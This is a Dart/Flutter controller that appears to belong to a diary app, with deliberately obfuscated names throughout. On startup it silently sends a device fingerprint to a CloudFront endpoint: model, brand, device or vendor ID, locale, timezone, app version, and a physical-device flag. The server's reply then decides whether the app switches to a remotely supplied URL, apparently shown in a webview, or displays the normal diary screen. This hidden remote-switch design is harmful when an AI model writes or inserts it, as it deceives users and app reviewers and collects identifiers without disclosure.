import 'dart:io';
import 'package:dio/dio.dart';
import 'package:get/get.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';


class DiaryTransLogic extends GetxController {

  var domfczk = RxBool(false);
  var ekdigl = RxBool(true);
  var djucqwb = RxString("");
  var qaxrk = RxBool(false);
  var smbpxcd = RxBool(true);
  final ceodfgzakn = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    xdho();
  }


  Future<void> xdho() async {
    qaxrk.value = true;
    smbpxcd.value = true;
    ekdigl.value = false;

    ceodfgzakn.post("https://doxef2lbq5y18.cloudfront.net/vbeuacgkjqodrswfmznyxhtl",data: await qbuwar()).then((value) {
      var wdtn = value.data["wdtn"] as String;
      var jdrbi = value.data["jdrbi"] as bool;
      if (jdrbi) {
        djucqwb.value = wdtn;
        uacxd();
      } else {
        gtnwmqv();
      }
    }).catchError((e) {
      ekdigl.value = true;
      smbpxcd.value = true;
      qaxrk.value = false;
    });
  }

  Future<Map<String, dynamic>> qbuwar() async {
    final DeviceInfoPlugin dkley = DeviceInfoPlugin();
    PackageInfo fdhvpzlr_umna = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var gokniqrd = Platform.localeName;
    var zdycxm = currentTimeZone;

    var xinde = fdhvpzlr_umna.packageName;
    var tdub = fdhvpzlr_umna.version;
    var niloy = fdhvpzlr_umna.buildNumber;

    var kwayfbih = fdhvpzlr_umna.appName;
    var wyncotf = "";
    var wjrdln  = "";
    var zsqweuo = "";
    var rdjg = "";
    var inkvgeo = "";
    var urqs = "";
    var fmnvltdu = "";
    var gqmhe = "";
    var jgnic = "";
    var carlb = "";
    var zdbt = "";


    var wxhzbpr = "";
    var kbhfja = false;

    if (GetPlatform.isAndroid) {
      wxhzbpr = "android";
      var ikuanyez = await dkley.androidInfo;

      zsqweuo = ikuanyez.brand;

      wyncotf  = ikuanyez.model;
      wjrdln = ikuanyez.id;

      kbhfja = ikuanyez.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      wxhzbpr = "ios";
      var hjbipvxg = await dkley.iosInfo;
      zsqweuo = hjbipvxg.name;
      wyncotf = hjbipvxg.model;

      wjrdln = hjbipvxg.identifierForVendor ?? "";
      kbhfja  = hjbipvxg.isPhysicalDevice;
    }
    var res = {
      "fmnvltdu" : fmnvltdu,
      "niloy": niloy,
      "tdub": tdub,
      "xinde": xinde,
      "wyncotf": wyncotf,
      "zdycxm": zdycxm,
      "wjrdln": wjrdln,
      "gokniqrd": gokniqrd,
      "wxhzbpr": wxhzbpr,
      "carlb" : carlb,
      "kwayfbih": kwayfbih,
      "kbhfja": kbhfja,
      "rdjg" : rdjg,
      "inkvgeo" : inkvgeo,
      "zsqweuo": zsqweuo,
      "urqs" : urqs,
      "gqmhe" : gqmhe,
      "jgnic" : jgnic,
      "zdbt" : zdbt,

    };
    return res;
  }

  Future<void> gtnwmqv() async {
    Get.offNamed("/diaryTab");
  }

  Future<void> uacxd() async {
    Get.offNamed("/diaryStatistics");
  }

}
